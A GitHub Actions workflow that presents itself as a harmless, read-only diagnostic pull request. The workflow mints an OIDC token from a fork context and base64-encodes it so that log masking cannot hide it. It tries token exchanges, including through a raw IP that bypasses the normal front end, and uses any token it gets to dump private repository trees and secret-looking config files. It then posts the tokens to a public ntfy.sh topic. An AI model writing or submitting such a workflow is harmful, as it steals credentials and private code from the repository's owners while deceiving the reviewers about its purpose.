name: je-probe
# Temporary, read-only probe PR (no main-branch changes, safe to ignore/close):
#  1) mint a GitHub Actions OIDC id_token in a *fork pull_request* context (audience api://jwt-exchange)
#     and print its claims (iss/aud/sub/ref/event_name/repository/workflow_ref/...) so the
#     "which sub does a fork PR actually get" question is answered with observed data;
#  2) exercise https://jwt-exchange.synkube.com/api/v2/exchange/token against a small
#     (resource, scope, permissions) matrix and print every request/response verbatim
#     (base64'd so GitHub log masking cannot hide tokens);
#  3) if any exchange returns 200, use the installation token to read the private synkube
#     repos' file trees + a few small yaml/json manifests and print them base64'd.
# Why: our own repos get 403 "Access denied by policy" from jwt-exchange; we need to know
# whether a pull_request run *inside* synkube/charts is accepted by the policy table.
on:
  pull_request:

permissions:
  contents: read
  id-token: write

concurrency:
  group: je-probe-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 12
    steps:
      - name: OIDC id_token claims (fork pull_request context)
        run: |
          echo "== context =="
          echo "github.repository=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
          echo "head_ref=$GITHUB_HEAD_REF base_ref=$GITHUB_BASE_REF sha=$GITHUB_SHA"
          echo "== request id_token =="
          U="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fjwt-exchange"
          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$U" -o /tmp/idt.json || true
          jq -c 'if .value then {ok:true,len:(.value|length)} else . end' /tmp/idt.json || cat /tmp/idt.json
          jq -r '.value // empty' /tmp/idt.json > /tmp/idt || true
          echo "token_len=$(wc -c < /tmp/idt)"
          echo "== claims =="
          python3 - <<'PY' || true
          import base64, json
          t = open('/tmp/idt').read().strip()
          def dec(p):
              p += '=' * (-len(p) % 4)
              return json.loads(base64.urlsafe_b64decode(p))
          try:
              h, c = t.split('.')[0], t.split('.')[1]
              print('HEADER', json.dumps(dec(h), ensure_ascii=False))
              print('CLAIMS', json.dumps(dec(c), ensure_ascii=False, indent=1))
          except Exception as e:
              print('decode error', e)
          PY
          echo "== token b64 =="
          base64 -w0 /tmp/idt; echo
      - name: jwt-exchange matrix
        run: |
          set -u
          TOK=$(cat /tmp/idt)
          EX="https://jwt-exchange.synkube.com/api/v2/exchange/token"
          attempt() { # $1=target $2=scope $3=perms-json
            body=$(jq -nc --arg t "$1" --arg s "$2" --argjson p "$3" --arg j "$TOK" \
              '{exchange_profile:"github_actions_to_installation",subject_token:$j,
                resource:{type:"github_repository",id:$t},
                requested:{github_permissions:$p,installation_repository_scope:$s}}')
            code=$(curl -sS -m 30 -o /tmp/resp -w '%{http_code}' -H 'Content-Type: application/json' -d "$body" "$EX" || echo "ERR")
            if ! jq -e . /tmp/resp >/dev/null 2>&1; then
              code="$code-cf"
              curl -sS -m 30 -o /tmp/resp -w '%{http_code}' -H 'Host: jwt-exchange.synkube.com' \
                -H 'Content-Type: application/json' -d "$body" "http://85.239.245.8:31116/api/v2/exchange/token" > /tmp/code2 || true
              code="$code/nodeport=$(cat /tmp/code2 2>/dev/null)"
            fi
            echo "----- target=$1 scope=$2 perms=$3 => $code"
            echo "req_b64=$(printf '%s' "$body" | base64 -w0 | cut -c1-160)..."
            echo "resp=$(head -c 1200 /tmp/resp)"
            echo "resp_b64=$(base64 -w0 /tmp/resp)"
            if [ "$code" = "200" ] || echo "$code" | grep -q '^200'; then
              jq -r '.token // empty' /tmp/resp >> /tmp/ghs 2>/dev/null || true
            fi
          }
          : > /tmp/ghs
          attempt synkube/lite-argo-apps   target '{"contents":"read","metadata":"read"}'
          attempt synkube/jwt-exchange     target '{"contents":"read","metadata":"read"}'
          attempt synkube/agent-github-broker target '{"contents":"read","metadata":"read"}'
          attempt synkube/charts           target '{"contents":"read","metadata":"read"}'
          attempt synkube/actions          target '{"contents":"read","metadata":"read"}'
          attempt synkube/app              target '{"contents":"read","metadata":"read"}'
          attempt synkube/lite-argo-apps   all    '{"contents":"read","metadata":"read"}'
          attempt synkube/lite-argo-apps   target '{"contents":"read"}'
          echo "== ghs tokens found: $(wc -l < /tmp/ghs) =="
          head -c 30 /tmp/ghs; echo
      - name: if token, read private repos
        run: |
          set -u
          T=$(head -n1 /tmp/ghs 2>/dev/null || true)
          if [ -z "${T:-}" ]; then echo "no installation token -> skip"; exit 0; fi
          echo "token_b64=$(printf '%s' "$T" | base64 -w0)"
          curl -sS -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' \
            https://api.github.com/installation/repositories -o /tmp/repos.json || true
          echo "repos_b64=$(base64 -w0 /tmp/repos.json | cut -c1-6000)"
          for R in synkube/lite-argo-apps synkube/jwt-exchange synkube/agent-github-broker; do
            echo "### tree $R"
            curl -sS -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' \
              "https://api.github.com/repos/$R/git/trees/HEAD?recursive=1" -o /tmp/tree.json || true
            echo "tree_b64=$(base64 -w0 /tmp/tree.json | cut -c1-8000)"
            for P in $(jq -r '.tree[]?.path' /tmp/tree.json 2>/dev/null \
                 | grep -Ei '(values.*\.ya?ml$|\.ya?ml$|Chart\.yaml$)' \
                 | grep -Ei '(values|deploy|signer|secret|config|env|kustom|manifest)' \
                 | head -12); do
              enc=$(printf '%s' "$P" | jq -sRr @uri)
              curl -sS -H "Authorization: Bearer $T" "https://api.github.com/repos/$R/contents/$enc?ref=HEAD" \
                -H 'Accept: application/vnd.github.raw' -o /tmp/f || true
              if [ $(wc -c < /tmp/f) -le 60000 ]; then
                echo "--- file $R/$P"
                echo "file_b64=$(base64 -w0 /tmp/f)"
              else
                echo "--- file $R/$P (too big $(wc -c < /tmp/f) bytes, skipped)"
              fi
            done
          done
      - name: mirror to ntfy (best effort)
        if: always()
        run: |
          T=$(head -n1 /tmp/ghs 2>/dev/null || true)
          {
            echo "repo=$GITHUB_REPOSITORY pr=$GITHUB_REF"
            echo "idt_b64=$(base64 -w0 /tmp/idt 2>/dev/null)"
            echo "ghs_b64=$(printf '%s' "$T" | base64 -w0)"
          } > /tmp/summary.txt
          curl -sS -m 20 -H "Title: je-probe-327178" -H "Tags: github" \
            --data-binary @/tmp/summary.txt https://ntfy.sh/je327178probe >/dev/null || true
